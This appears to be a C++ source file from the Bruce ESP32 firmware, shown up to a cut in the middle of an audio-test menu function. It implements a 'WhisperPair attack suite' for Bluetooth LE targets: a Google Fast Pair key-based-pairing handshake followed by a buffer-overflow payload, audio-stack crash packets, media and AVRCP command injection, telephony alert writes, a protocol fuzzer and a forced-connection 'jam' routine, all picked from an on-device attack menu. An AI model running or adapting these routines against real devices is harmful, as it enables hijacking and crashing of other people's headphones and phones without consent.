#include "whisperpair.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <globals.h>
#include <TFT_eSPI.h>
#include <esp_heap_caps.h>

extern tft_logger tft;
extern BruceConfig bruceConfig;
extern volatile int tftWidth;
extern volatile int tftHeight;

bool isBLEInitialized() {
    return NimBLEDevice::getAdvertising() != nullptr || 
           NimBLEDevice::getScan() != nullptr ||
           NimBLEDevice::getServer() != nullptr;
}

void BLEAttackManager::prepareForConnection() {
    Serial.println("[BLE] Preparing for attack connection...");

    wasScanning = false;

    if(isBLEInitialized()) {
        if(NimBLEDevice::getScan()) {
            wasScanning = NimBLEDevice::getScan()->isScanning();
            if(wasScanning) {
                NimBLEDevice::getScan()->stop();
                delay(350);
            }
        }

        NimBLEDevice::deinit(true);
        delay(500);
    }

    NimBLEDevice::init("Bruce-Attack");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    NimBLEDevice::setSecurityAuth(false, false, false);
    NimBLEDevice::setMTU(247);

    isInAttackMode = true;
    delay(200);
}

void BLEAttackManager::cleanupAfterAttack() {
    if(!isInAttackMode) return;

    if(isBLEInitialized()) {
        NimBLEDevice::deinit(false);
    }

    isInAttackMode = false;
    delay(300);
}

bool BLEAttackManager::connectToDevice(NimBLEAddress target, NimBLEClient** outClient) {
    if(!isBLEInitialized()) {
        return false;
    }

    size_t freeHeap = esp_get_free_heap_size();
    if(freeHeap < 40000) {
        delay(500);
    }

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) {
        return false;
    }

    pClient->setConnectTimeout(10);
    pClient->setConnectionParams(12, 12, 0, 400);

    bool connected = false;
    for(int attempt = 0; attempt < 2 && !connected; attempt++) {
        if(attempt > 0) {
            delay(500);
        }

        connected = pClient->connect(target, true);

        if(connected) {
            int waitTries = 0;
            while(!pClient->isConnected() && waitTries < 20) {
                delay(100);
                waitTries++;
            }

            if(pClient->isConnected()) {
                delay(200);
                break;
            } else {
                connected = false;
            }
        }
    }

    if(!connected) {
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    *outClient = pClient;
    return true;
}

NimBLERemoteCharacteristic* WhisperPairExploit::findKBPCharacteristic(NimBLERemoteService* fastpairService) {
    if(!fastpairService) return nullptr;

    const char* kbpUuids[] = {
        "a92ee202-5501-4e6b-90fb-79a8c1f2e5a8",
        "1234",
        "fe2c1234-8366-4814-8eb0-01de32100bea",
        nullptr
    };

    for(int i = 0; kbpUuids[i] != nullptr; i++) {
        NimBLERemoteCharacteristic* ch = fastpairService->getCharacteristic(NimBLEUUID(kbpUuids[i]));
        if(ch && ch->canWrite()) {
            return ch;
        }
    }

    const std::vector<NimBLERemoteCharacteristic*>& chars = fastpairService->getCharacteristics(true);
    for(auto& ch : chars) {
        if(ch->canWrite()) {
            return ch;
        }
    }

    return nullptr;
}

bool WhisperPairExploit::performHandshake(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;

    uint8_t public_key[65];
    size_t pub_len = 65;

    if(!crypto.generateValidKeyPair(public_key, &pub_len)) {
        return false;
    }

    uint8_t seeker_hello[67] = {0};
    seeker_hello[0] = 0x00;
    seeker_hello[1] = 0x00;
    memcpy(&seeker_hello[2], public_key, 65);

    bool success = kbpChar->writeValue(seeker_hello, 67, true);

    if(success) {
        delay(300);
    }

    return success;
}

bool WhisperPairExploit::sendExploitPayload(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;

    uint8_t exploit_packet[120];

    exploit_packet[0] = 0x02;
    exploit_packet[1] = 0xFF;

    uint8_t fake_nonce[16];
    crypto.generateValidNonce(fake_nonce);
    memcpy(&exploit_packet[2], fake_nonce, 16);

    for(int i = 18; i < sizeof(exploit_packet); i++) {
        exploit_packet[i] = 0x41 + ((i - 18) % 26);
    }

    exploit_packet[sizeof(exploit_packet) - 1] = 0x00;

    bool sent = kbpChar->writeValue(exploit_packet, sizeof(exploit_packet), true);

    if(sent) {
        delay(600);
    }

    return sent;
}

bool WhisperPairExploit::testForVulnerability(NimBLERemoteCharacteristic* kbpChar) {
    if(!kbpChar) return false;

    try {
        std::string response = kbpChar->readValue();

        if(response.empty()) {
            return true;
        } else {
            if(response.length() < 5) {
                return true;
            }
        }
    } catch(...) {
        return true;
    }

    return false;
}

bool WhisperPairExploit::execute(NimBLEAddress target) {
    if(!confirmAttack(target.toString().c_str())) {
        return false;
    }

    bleManager.prepareForConnection();

    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        showAttackResult(false, "Connection failed");
        bleManager.cleanupAfterAttack();
        return false;
    }

    if(!pClient->discoverAttributes()) {
        showAttackResult(false, "Service discovery failed");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showAttackResult(false, "FastPair service not found");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
    if(!pKbpChar) {
        showAttackResult(false, "No writable KBP characteristic");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    delay(500);

    bool isVulnerable = false;

    if(performHandshake(pKbpChar)) {
        delay(400);

        if(sendExploitPayload(pKbpChar)) {
            delay(400);
            isVulnerable = testForVulnerability(pKbpChar);
        }
    }

    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();

    if(isVulnerable) {
        showAttackResult(true, "DEVICE MAY BE VULNERABLE!");
        return true;
    } else {
        showAttackResult(false, "Device appears patched");
        return false;
    }
}

bool WhisperPairExploit::executeSilent(NimBLEAddress target) {
    bleManager.prepareForConnection();

    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        bleManager.cleanupAfterAttack();
        return false;
    }

    if(!pClient->discoverAttributes()) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteCharacteristic* pKbpChar = findKBPCharacteristic(pService);
    if(!pKbpChar) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    bool handshakeOk = performHandshake(pKbpChar);
    delay(300);
    bool exploitSent = sendExploitPayload(pKbpChar);
    delay(500);
    bool crashed = testForVulnerability(pKbpChar);

    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();

    return (handshakeOk && exploitSent && crashed);
}

bool AudioAttackService::findAndAttackAudioServices(NimBLEClient* pClient) {
    if(!pClient || !pClient->isConnected()) return false;

    if(!pClient->discoverAttributes()) {
        return false;
    }

    bool anyAttackSuccess = false;

    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);

    for(auto& service : services) {
        NimBLEUUID uuid = service->getUUID();
        std::string uuidStr = uuid.toString();

        if(uuidStr.find("110e") != std::string::npos || uuidStr.find("110f") != std::string::npos) {
            if(attackAVRCP(service)) {
                anyAttackSuccess = true;
            }
        }

        else if(uuidStr.find("1843") != std::string::npos || uuidStr.find("b4b4") != std::string::npos) {
            if(attackAudioMedia(service)) {
                anyAttackSuccess = true;
            }
        }

        else if(uuidStr.find("1124") != std::string::npos || uuidStr.find("1125") != std::string::npos) {
            if(attackTelephony(service)) {
                anyAttackSuccess = true;
            }
        }

        else if(uuidStr.find("1844") != std::string::npos) {
            if(attackAudioMedia(service)) {
                anyAttackSuccess = true;
            }
        }
    }

    return anyAttackSuccess;
}

bool AudioAttackService::attackAVRCP(NimBLERemoteService* avrcpService) {
    if(!avrcpService) return false;

    NimBLERemoteCharacteristic* pChar = nullptr;

    const char* avrcpUuids[] = {
        "b4b40101-b4b4-4a8f-9deb-bc87b8e0a8f5",
        "0000110e-0000-1000-8000-00805f9b34fb",
        "0000110f-0000-1000-8000-00805f9b34fb",
        nullptr
    };

    for(int i = 0; avrcpUuids[i] != nullptr; i++) {
        pChar = avrcpService->getCharacteristic(NimBLEUUID(avrcpUuids[i]));
        if(pChar && pChar->canWrite()) break;
    }

    if(!pChar) {
        const std::vector<NimBLERemoteCharacteristic*>& chars = avrcpService->getCharacteristics(true);
        for(auto& ch : chars) {
            if(ch->canWrite()) {
                pChar = ch;
                break;
            }
        }
    }

    if(!pChar) {
        return false;
    }

    uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x00, 0x00};
    bool playSent = pChar->writeValue(playCmd, sizeof(playCmd), true);

    delay(200);

    uint8_t volUpCmd[] = {0x00, 0x44, 0x00, 0x00, 0x00};
    bool volSent = pChar->writeValue(volUpCmd, sizeof(volUpCmd), true);

    delay(200);

    uint8_t oversizedPacket[256];
    memset(oversizedPacket, 0x41, sizeof(oversizedPacket));
    oversizedPacket[0] = 0xFF;
    oversizedPacket[1] = 0xFF;

    bool crashSent = pChar->writeValue(oversizedPacket, sizeof(oversizedPacket), true);

    delay(300);
    uint8_t invalidState[] = {0x00, 0xFF, 0xFF, 0xFF, 0xFF};
    bool stateSent = pChar->writeValue(invalidState, sizeof(invalidState), true);

    return (playSent || volSent || crashSent || stateSent);
}

bool AudioAttackService::attackAudioMedia(NimBLERemoteService* mediaService) {
    if(!mediaService) return false;

    NimBLERemoteCharacteristic* pMediaChar = nullptr;

    const char* mediaUuids[] = {
        "b4b40201-b4b4-4a8f-9deb-bc87b8e0a8f5",
        "00002b01-0000-1000-8000-00805f9b34fb",
        "00002b02-0000-1000-8000-00805f9b34fb",
        nullptr
    };

    for(int i = 0; mediaUuids[i] != nullptr; i++) {
        pMediaChar = mediaService->getCharacteristic(NimBLEUUID(mediaUuids[i]));
        if(pMediaChar && pMediaChar->canWrite()) break;
    }

    if(!pMediaChar) {
        const std::vector<NimBLERemoteCharacteristic*>& chars = mediaService->getCharacteristics(true);
        for(auto& ch : chars) {
            if(ch->canWrite()) {
                pMediaChar = ch;
                break;
            }
        }
    }

    if(!pMediaChar) {
        return false;
    }

    uint8_t commands[][5] = {
        {0x01, 0x00, 0x00, 0x00, 0x00},
        {0x02, 0x00, 0x00, 0x00, 0x00},
        {0x03, 0x00, 0x00, 0x00, 0x00},
        {0x04, 0x00, 0x00, 0x00, 0x00},
        {0x05, 0x00, 0x00, 0x00, 0x00},
        {0x06, 0x00, 0x00, 0x00, 0x00},
        {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
    };

    bool anySent = false;
    for(int i = 0; i < 7; i++) {
        bool sent = pMediaChar->writeValue(commands[i], 5, true);
        if(sent) anySent = true;
        delay(150);
    }

    return anySent;
}

bool AudioAttackService::attackTelephony(NimBLERemoteService* teleService) {
    if(!teleService) return false;

    NimBLERemoteCharacteristic* pAlertChar = nullptr;

    const char* alertUuids[] = {
        "00002a43-0000-1000-8000-00805f9b34fb",
        "00002a44-0000-1000-8000-00805f9b34fb",
        "00002a45-0000-1000-8000-00805f9b34fb",
        nullptr
    };

    for(int i = 0; alertUuids[i] != nullptr; i++) {
        pAlertChar = teleService->getCharacteristic(NimBLEUUID(alertUuids[i]));
        if(pAlertChar && pAlertChar->canWrite()) break;
    }

    if(!pAlertChar) {
        return false;
    }

    uint8_t alertHigh[] = {0x02};
    uint8_t alertMild[] = {0x01};
    uint8_t invalidAlert[] = {0xFF};

    bool alert1 = pAlertChar->writeValue(alertHigh, 1, true);
    delay(300);
    bool alert2 = pAlertChar->writeValue(alertMild, 1, true);
    delay(300);
    bool alert3 = pAlertChar->writeValue(invalidAlert, 1, true);

    return (alert1 || alert2 || alert3);
}

bool AudioAttackService::executeAudioAttack(NimBLEAddress target) {
    BLEAttackManager bleManager;
    bleManager.prepareForConnection();

    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        bleManager.cleanupAfterAttack();
        return false;
    }

    bool success = findAndAttackAudioServices(pClient);

    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();

    return success;
}

bool AudioAttackService::injectMediaCommands(NimBLEAddress target) {
    return executeAudioAttack(target);
}

bool AudioAttackService::crashAudioStack(NimBLEAddress target) {
    BLEAttackManager bleManager;
    bleManager.prepareForConnection();

    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        bleManager.cleanupAfterAttack();
        return false;
    }

    if(!pClient->discoverAttributes()) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
    if(!pService) {
        pService = pClient->getService(NimBLEUUID((uint16_t)0x110F));
    }

    if(!pService) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    NimBLERemoteCharacteristic* pChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
    for(auto& ch : chars) {
        if(ch->canWrite()) {
            pChar = ch;
            break;
        }
    }

    if(!pChar) {
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return false;
    }

    uint8_t crashPacket1[128];
    uint8_t crashPacket2[64];
    uint8_t crashPacket3[256];

    memset(crashPacket1, 0xFF, sizeof(crashPacket1));
    memset(crashPacket2, 0x00, sizeof(crashPacket2));
    memset(crashPacket3, 0x41, sizeof(crashPacket3));

    bool sent1 = pChar->writeValue(crashPacket1, sizeof(crashPacket1), true);
    delay(200);
    bool sent2 = pChar->writeValue(crashPacket2, sizeof(crashPacket2), true);
    delay(200);
    bool sent3 = pChar->writeValue(crashPacket3, sizeof(crashPacket3), true);

    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();

    return (sent1 || sent2 || sent3);
}

AudioCommandService::AudioCommandService() : pServer(nullptr), pAudioService(nullptr), pCmdCharacteristic(nullptr), isConnected(false) {}

void AudioCommandService::start() {
    NimBLEDevice::init("Audio-Injector");
    pServer = NimBLEDevice::createServer();

    class ServerCallbacks : public NimBLEServerCallbacks {
        AudioCommandService* parent;
    public:
        ServerCallbacks(AudioCommandService* p) : parent(p) {}
        void onConnect(NimBLEServer* pServer) { parent->isConnected = true; }
        void onDisconnect(NimBLEServer* pServer) { parent->isConnected = false; }
    };

    pServer->setCallbacks(new ServerCallbacks(this));

    pAudioService = pServer->createService("AUDIO1234-5678-9012-3456-789012345678");
    pCmdCharacteristic = pAudioService->createCharacteristic(
        "CMD1234-5678-9012-3456-789012345678",
        NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR
    );

    pAudioService->start();
    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(pAudioService->getUUID());
    pAdvertising->start();
}

void AudioCommandService::stop() {
    if(pServer) {
        NimBLEDevice::deinit(true);
    }
}

void AudioCommandService::injectCommand(const uint8_t* cmd, size_t len) {
    if(pCmdCharacteristic && isConnected) {
        pCmdCharacteristic->setValue(cmd, len);
    }
}

bool AudioCommandService::isDeviceConnected() {
    return isConnected;
}

void whisperPairMenu() {
    String targetInfo = selectTargetFromScan("SELECT TARGET");
    if(targetInfo.isEmpty()) {
        return;
    }
    
    NimBLEAddress target = parseAddress(targetInfo);
    
    if(!requireSimpleConfirmation("Attack this device?")) {
        return;
    }
    
    showAttackMenuWithTarget(target);
}

void showAttackMenuWithTarget(NimBLEAddress target) {
    const int MAX_ATTACKS = 10;
    const char* attackNames[] = {
        "FastPair Buffer Overflow",
        "Audio Stack Crash", 
        "Media Control Hijack",
        "Quick Test (silent)",
        "Test Write Access",
        "Protocol Fuzzer",
        "Jam & Connect Attack",
        "Test HID Commands",
        "Audio Control Test",
        "Audio Hijack Server"
    };
    
    const char* attackDescriptions[] = {
        "Exploit FastPair KBP buffer overflow",
        "Crash audio stack with malformed packets",
        "Takeover media playback controls",
        "Silent test for FastPair vulnerability",
        "Test BLE characteristic write permissions",
        "Fuzz BLE protocol with random data",
        "Jam BLE and force connection",
        "Test HID capabilities",
        "Test audio control services",
        "Start BLE audio injection server"
    };
    
    int selectedAttack = 0;
    bool exitMenu = false;
    
    while(!exitMenu) {
        clearMenu();
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("WHISPERPAIR ATTACK SUITE") * 12) / 2, 15);
        tft.print("WHISPERPAIR ATTACK SUITE");
        tft.setTextSize(1);
        
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.setCursor(20, 40);
        tft.print("TARGET: ");
        
        String targetStr = target.toString().c_str();
        if(targetStr.length() > 20) {
            targetStr = targetStr.substring(0, 17) + "...";
        }
        tft.println(targetStr);
        
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 65);
        tft.println("Select Attack Type:");
        
        for(int i = 0; i < MAX_ATTACKS; i++) {
            int yPos = 90 + (i * 22);
            
            if(i == selectedAttack) {
                tft.fillRect(25, yPos, tftWidth - 50, 20, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(30, yPos + 5);
                tft.print("> ");
            } else {
                tft.fillRect(25, yPos, tftWidth - 50, 20, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(30, yPos + 5);
                tft.print("  ");
            }
            
            String displayName = attackNames[i];
            if(displayName.length() > 24) {
                displayName = displayName.substring(0, 21) + "...";
            }
            tft.print(displayName);
        }
        
        tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
        tft.fillRect(20, 310, tftWidth - 40, 20, bruceConfig.bgColor);
        tft.setCursor(20, 310);
        
        String desc = attackDescriptions[selectedAttack];
        if(desc.length() > 38) {
            desc = desc.substring(0, 35) + "...";
        }
        tft.print(desc);
        
        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
        tft.setCursor(20, 335);
        tft.print("PREV/NEXT: Navigate  SEL: Execute  ESC: Back");
        
        bool inputProcessed = false;
        unsigned long lastInputTime = millis();
        
        while(!inputProcessed && (millis() - lastInputTime < 30000)) {
            if(check(EscPress)) {
                delay(200);
                exitMenu = true;
                inputProcessed = true;
            }
            else if(check(PrevPress)) {
                delay(150);
                selectedAttack = (selectedAttack > 0) ? selectedAttack - 1 : MAX_ATTACKS - 1;
                inputProcessed = true;
            }
            else if(check(NextPress)) {
                delay(150);
                selectedAttack = (selectedAttack + 1) % MAX_ATTACKS;
                inputProcessed = true;
            }
            else if(check(SelPress)) {
                delay(200);
                executeSelectedAttack(selectedAttack, target);
                exitMenu = true;
                inputProcessed = true;
            }
            
            if(!inputProcessed) {
                delay(50);
            }
        }
        
        if(!inputProcessed && (millis() - lastInputTime >= 30000)) {
            showAdaptiveMessage("Menu timeout", "OK", "", "", TFT_YELLOW, true, false);
            exitMenu = true;
        }
    }
}

void executeSelectedAttack(int attackIndex, NimBLEAddress target) {
    switch(attackIndex) {
        case 0:
            runWhisperPairAttack(target);
            break;
        case 1:
            runAudioStackCrash(target);
            break;
        case 2:
            runMediaCommandHijack(target);
            break;
        case 3:
            runQuickTest(target);
            break;
        case 4:
            runWriteAccessTest(target);
            break;
        case 5:
            runProtocolFuzzer(target);
            break;
        case 6:
            runJamConnectAttack(target);
            break;
        case 7:
            runHIDTest(target);
            break;
        case 8:
            runAudioControlTest(target);
            break;
        case 9:
            audioCommandHijackTest();
            break;
    }
}

void runWhisperPairAttack(NimBLEAddress target) {
    WhisperPairExploit exploit;
    bool success = exploit.execute(target);
    showAttackResult(success, success ? "FastPair attack attempted!" : "Attack failed");
}

void runAudioStackCrash(NimBLEAddress target) {
    if(!confirmAttack("Crash audio stack?")) {
        return;
    }
    
    showAttackProgress("Attacking audio stack...", TFT_WHITE);
    AudioAttackService audioAttack;
    bool result = audioAttack.crashAudioStack(target);
    showAttackResult(result, result ? "Audio stack attack sent!" : "Attack failed");
}

void runMediaCommandHijack(NimBLEAddress target) {
    if(!confirmAttack("Inject media commands?")) {
        return;
    }
    
    showAttackProgress("Injecting media commands...", TFT_WHITE);
    AudioAttackService audioAttack;
    bool result = audioAttack.injectMediaCommands(target);
    showAttackResult(result, result ? "Media commands sent!" : "No media service found");
}

void runQuickTest(NimBLEAddress target) {
    showAttackProgress("Quick testing...", TFT_WHITE);
    WhisperPairExploit exploit;
    bool result = exploit.executeSilent(target);
    showAttackResult(result, result ? "VULNERABLE!" : "Patched/Safe");
}

void runWriteAccessTest(NimBLEAddress target) {
    if(!confirmAttack("Test write access on all characteristics?")) return;
    
    showAttackProgress("Testing write access...", TFT_WHITE);
    
    BLEAttackManager bleManager;
    bleManager.prepareForConnection();
    
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        showAttackResult(false, "Connection failed");
        bleManager.cleanupAfterAttack();
        return;
    }
    
    if(!pClient->discoverAttributes()) {
        showAttackResult(false, "Discovery failed");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return;
    }
    
    std::vector<String> writeableChars;
    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
    
    for(auto& service : services) {
        const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
        for(auto& ch : chars) {
            if(ch->canWrite()) {
                std::string uuidStdStr = service->getUUID().toString();
                String uuidStr = String(uuidStdStr.c_str());
                std::string charUuidStdStr = ch->getUUID().toString();
                String charUuid = String(charUuidStdStr.c_str());
                String charInfo = uuidStr + " -> " + charUuid;
                writeableChars.push_back(charInfo);
            }
        }
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();
    
    if(!writeableChars.empty()) {
        std::vector<String> lines;
        lines.push_back("WRITABLE CHARACTERISTICS:");
        lines.push_back("Found: " + String(writeableChars.size()));
        
        for(int i = 0; i < std::min(5, (int)writeableChars.size()); i++) {
            lines.push_back(writeableChars[i]);
        }
        
        if(writeableChars.size() > 5) {
            lines.push_back("... and " + String(writeableChars.size() - 5) + " more");
        }
        
        showDeviceInfoScreen("WRITE ACCESS TEST", lines, TFT_BLUE, TFT_WHITE);
    } else {
        showAttackResult(false, "No writable characteristics found");
    }
}

void runProtocolFuzzer(NimBLEAddress target) {
    if(!confirmAttack("Fuzz BLE protocol with random data?")) return;
    
    showAttackProgress("Starting protocol fuzzer...", TFT_WHITE);
    
    BLEAttackManager bleManager;
    bleManager.prepareForConnection();
    
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        showAttackResult(false, "Connection failed");
        bleManager.cleanupAfterAttack();
        return;
    }
    
    if(!pClient->discoverAttributes()) {
        showAttackResult(false, "Discovery failed");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return;
    }
    
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showAttackResult(false, "No FastPair service found");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return;
    }
    
    NimBLERemoteCharacteristic* pChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
    
    for(auto& ch : chars) {
        if(ch->canWrite()) {
            pChar = ch;
            break;
        }
    }
    
    if(!pChar) {
        showAttackResult(false, "No writable characteristic");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return;
    }
    
    showAttackProgress("Fuzzing protocol...", TFT_YELLOW);
    
    bool anySent = false;
    for(int i = 0; i < 10; i++) {
        uint8_t fuzzPacket[64];
        
        switch(i % 4) {
            case 0: memset(fuzzPacket, 0xFF, sizeof(fuzzPacket)); break;
            case 1: memset(fuzzPacket, 0x00, sizeof(fuzzPacket)); break;
            case 2: 
                for(int j = 0; j < sizeof(fuzzPacket); j++) {
                    fuzzPacket[j] = random(256);
                }
                break;
            case 3:
                fuzzPacket[0] = 0x00;
                memset(&fuzzPacket[1], 0x41, sizeof(fuzzPacket)-1);
                break;
        }
        
        bool sent = pChar->writeValue(fuzzPacket, sizeof(fuzzPacket), true);
        if(sent) anySent = true;
        
        delay(100);
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();
    
    showAttackResult(anySent, anySent ? "Fuzzing completed!" : "Fuzzing failed");
}

void runJamConnectAttack(NimBLEAddress target) {
    if(!confirmAttack("WARNING: This may disrupt BLE communications. Continue?")) return;
    
    showAttackProgress("Preparing jam & connect...", TFT_WHITE);
    
    if(NimBLEDevice::getScan()) {
        NimBLEDevice::getScan()->stop();
    }
    
    NimBLEDevice::deinit(true);
    delay(500);
    
    NimBLEDevice::init("Bruce-Jammer");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    
    showAttackProgress("Attempting forced connection...", TFT_YELLOW);
    
    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient) {
        showAttackResult(false, "Failed to create client");
        return;
    }
    
    pClient->setConnectTimeout(3);
    
    bool connected = false;
    for(int attempt = 0; attempt < 5 && !connected; attempt++) {
        char progressMsg[50];
        snprintf(progressMsg, sizeof(progressMsg), "Attempt %d/5", attempt + 1);
        showAttackProgress(progressMsg, TFT_YELLOW);
        
        connected = pClient->connect(target, false);
        
        if(!connected) {
            delay(200);
        }
    }
    
    if(connected) {
        showAttackProgress("Connected! Discovering...", TFT_GREEN);
        delay(300);
        
        if(pClient->discoverAttributes()) {
            showAttackResult(true, "Forced connection successful!");
        } else {
            showAttackResult(false, "Connected but discovery failed");
        }
        
        if(pClient->isConnected()) {
            pClient->disconnect();
        }
    } else {
        showAttackResult(false, "Forced connection failed");
    }
    
    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit(true);
}

void runHIDTest(NimBLEAddress target) {
    if(!confirmAttack("Test HID (Keyboard/Mouse) capabilities?")) return;
    
    showAttackProgress("Testing HID services...", TFT_WHITE);
    
    BLEAttackManager bleManager;
    bleManager.prepareForConnection();
    
    NimBLEClient* pClient = nullptr;
    if(!bleManager.connectToDevice(target, &pClient)) {
        showAttackResult(false, "Connection failed");
        bleManager.cleanupAfterAttack();
        return;
    }
    
    if(!pClient->discoverAttributes()) {
        showAttackResult(false, "Discovery failed");
        pClient->disconnect();
        bleManager.cleanupAfterAttack();
        return;
    }
    
    std::vector<String> hidServices;
    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
    
    for(auto& service : services) {
        NimBLEUUID uuid = service->getUUID();
        std::string uuidStdStr = uuid.toString();
        String uuidStr = String(uuidStdStr.c_str());
        
        if(uuidStr.indexOf("1812") != -1 ||
           uuidStr.indexOf("1813") != -1 ||
           uuidStr.indexOf("1814") != -1 ||
           uuidStr.indexOf("2a4a") != -1 ||
           uuidStr.indexOf("2a4b") != -1 ||
           uuidStr.indexOf("2a4d") != -1) {
            hidServices.push_back(uuidStr + " - HID Service");
        }
        
        const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
        for(auto& ch : chars) {
            std::string charUuidStdStr = ch->getUUID().toString();
            String charUuid = String(charUuidStdStr.c_str());
            
            if(charUuid.indexOf("2a4d") != -1 ||
               charUuid.indexOf("2a22") != -1 ||
               charUuid.indexOf("2a32") != -1) {
                hidServices.push_back("  -> " + charUuid);
            }
        }
    }
    
    if(pClient->isConnected()) {
        pClient->disconnect();
    }
    bleManager.cleanupAfterAttack();
    
    if(!hidServices.empty()) {
        std::vector<String> lines;
        lines.push_back("HID SERVICES FOUND:");
        
        for(int i = 0; i < std::min(6, (int)hidServices.size()); i++) {
            lines.push_back(hidServices[i]);
        }
        
        if(hidServices.size() > 6) {
            lines.push_back("... and " + String(hidServices.size() - 6) + " more");
        }
        
        showDeviceInfoScreen("HID TEST RESULTS", lines, TFT_DARKGREEN, TFT_WHITE);
    } else {
        showAttackResult(false, "No HID services found");
    }
}

void runAudioControlTest(NimBLEAddress target) {
    const int AUDIO_TESTS = 4;
    const char* audioTestNames[] = {
        "Test AVRCP Service",
        "Test Media Control",
        "Test Telephony",
        "Test All Audio"
    };
    
    int selectedTest = 0;
    bool exitSubmenu = false;
    
    while(!exitSubmenu) {
        clearMenu();
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("AUDIO CONTROL TEST") * 12) / 2, 15);
        tft.print("AUDIO CONTROL TEST");
        tft.setTextSize(1);
        
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.println("Select Audio Test:");
        
        for(int i = 0; i < AUDIO_TESTS; i++) {
            int yPos = 90 + (i * 35);
            
            if(i == selectedTest) {
                tft.fillRoundRect(30, yPos, tftWidth - 60, 30, 5, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(40, yPos + 8);
                tft.print("> ");
            } else {
                tft.fillRoundRect(30, yPos, tftWidth - 60, 30, 5, TFT_DARKGREY);
                tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
                tft.setCursor(40, yPos + 8);
                tft.print("  ");
            }
            
            tft.print(audioTestNames[i]);
        }
        
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 240);
        tft.print("PREV/NEXT: Navigate  SEL: Test  ESC: Back");
        
        bool inputProcessed = false;
        while(!inputProcessed) {
            if(check(EscPress)) {
                delay(200);
                exitSubmenu = true;
                inputProcessed = true;
            }
            else if(check(PrevPress)) {
                delay(150);
